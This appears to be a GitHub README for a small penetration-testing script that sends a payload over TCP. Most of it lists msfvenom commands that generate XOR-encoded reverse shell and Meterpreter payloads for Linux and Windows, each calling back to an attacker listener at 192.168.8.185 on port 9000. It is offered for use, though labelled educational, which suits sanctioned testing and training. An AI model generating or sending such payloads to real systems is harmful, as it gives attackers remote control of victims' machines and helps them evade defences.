# Send TCP Payload

Send a payload through the TCP.

Tested on Kali Linux v2020.2 (64-bit).

Made for educational purposes. I hope it will help!

## How to Run

**Change the IP address, port number and payload inside the script as necessary.**

Open the GNOME Terminal from [/src/](https://github.com/ivan-sincek/send-tcp-payload/tree/master/src) and run the following Bash command:

```fundamental
python3 send_tcp_payload.py
```

## Generate a Reverse Shell Payload

To generate a reverse shell payload for `Linux OS` use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform linux -a x86 -e x86/call4_dword_xor -p linux/x86/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform linux -a x86 -e x86/call4_dword_xor -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python

msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python
```

To generate a reverse shell payload for `Windows OS` use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/send-tcp-payload/blob/master/img/send_payload.jpg" alt="Sending a Payload"></p>

<p align="center">Figure 1 - Sending a Payload</p>
